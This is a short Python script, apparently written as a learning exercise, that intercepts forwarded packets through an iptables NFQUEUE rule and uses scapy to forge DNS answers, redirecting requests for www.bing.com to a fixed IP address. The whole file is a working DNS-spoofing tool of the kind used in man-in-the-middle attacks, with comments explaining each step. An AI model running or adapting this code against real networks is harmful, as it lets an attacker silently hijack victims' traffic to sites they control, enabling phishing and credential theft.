#!/usr/bin/env python

import netfilterqueue as netfilterq
import scapy.all as scapy

# This script should be run in linux
# It relies on iptable queue to store the received packets before redirection
# iptables -I FORWARD -j NFQUEUE --queue-num 0

def access_packet_queue():
    #NetFilter instance
    queue = netfilterq.NetfilterQueue()
    #Binding to previous created queue
    queue.bind(0, packet_callback)
    queue.run()

def packet_callback(packet):

    #Converting packet from the queue in toscapy format
    s_packet = scapy.IP(packet.get_payload())
    # Filtering DNS Responses
    if s_packet.haslayer(scapy.DNSRR):
        #Getting qname fled from the response
        qname = s_packet[scapy.DNSQR].qname
        print(qname)
        if "www.bing.com" in qname:
            print("Got DNS Request to BING redirecting..\n")
            # Creating a new DNS Response
            answer = scapy.DNSRR(rrname=qname, rdata="216.58.211.227")
            # Adding the answer to the answer (an) record
            s_packet[scapy.DNS].an = answer
            # Editing the number of answers to 1
            s_packet[scapy.DNS].ancount = 1

            # Deleting fields from the original response (scapy will recalculate before sending)
            del s_packet[scapy.IP].len
            del s_packet[scapy.IP].chksum
            del s_packet[scapy.UDP].len
            del s_packet[scapy.UDP].chksum
            print(s_packet.show())
            packet.set_payload(str(s_packet))

    packet.accept()


access_packet_queue()